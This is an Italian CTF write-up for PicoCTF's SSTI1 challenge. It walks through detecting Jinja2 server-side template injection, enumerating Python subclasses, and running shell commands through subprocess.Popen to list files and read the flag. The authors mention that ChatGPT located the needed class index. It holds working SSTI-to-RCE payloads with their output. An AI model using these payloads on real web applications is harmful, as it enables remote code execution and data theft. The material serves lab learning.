## Risoluzione della sfida SSTI1 di PicoCTF

Si tratta di **Server-Side Template Injection (SSTI)**.  
### **1. Riconoscimento della vulnerabilità**

- Inserendo `{{ 7 * 7 }}` in un campo del form, abbiamo ottenuto `49`.
- Il fatto che `{{ 7 * 7 }}` venga valutato come `49` indica che il server sta interpretando il contenuto inserito come codice template (probabilmente **Jinja2**, usato in Flask, o un motore simile).
### **2. Conferma del motore template**

- Abbiamo testato `{{ 7 * '7' }}` → risultato `7777777`.
- Questo comportamento (moltiplicazione stringa * intero = ripetizione) è tipico di Jinja2, basato su Python.
### **3. Esplorazione dell’ambiente Python via SSTI**

- Payload usato per ottenere la gerarchia delle classi:  
`{{ ''.__class__.__mro__[1].__subclasses__() }}`
- Questo restituisce una lista di tutte le classi disponibili nel sistema, ereditabili da `object`.
### **4. Ricerca di classi utili per RCE (Remote Code Execution)**

- Dalla lista, cerchiamo classi come: `subprocess.Popen` → per eseguire comandi shell.

Per trovare l'indice della classe lo abbiamo chiesto a ChatGPT inserendo il lungo elenco di classi restituito con il precedente comando `{{ ''.__class__.__mro__[1].__subclasses__() }}`
Ci ha restituito 356
### **5. Esecuzione di comandi**

- Con `Popen`, abbiamo eseguito `ls -la` per esplorare il filesystem:
`{{ ''.__class__.__mro__[1].__subclasses__()[356](['ls', '-la'], shell=False, stdout=-1).communicate()[0] }}`
- Abbiamo visto un file chiamato `flag` nella directory corrente.
```
b'total 12\ndrwxr-xr-x 1 root root 25 Jan 25 13:19 .\ndrwxr-xr-x 1 root root 23 Jan 25 13:19 ..\ndrwxr-xr-x 2 root root 32 Jan 25 13:19 __pycache__\n-rwxr-xr-x 1 root root 1241 May 1 2025 app.py\n-rw-r--r-- 1 root root 58 Aug 21 19:27 flag\n-rwxr-xr-x 1 root root 268 May 1 2025 requirements.txt\n'
```
### **6. Lettura della flag**

- Comando finale per leggere il file `flag`:
`{{ ''.__class__.__mro__[1].__subclasses__()[356](['cat', 'flag'], shell=False, stdout=-1).communicate()[0] }}`
- Risultato: il contenuto del file, che è la flag della sfida.
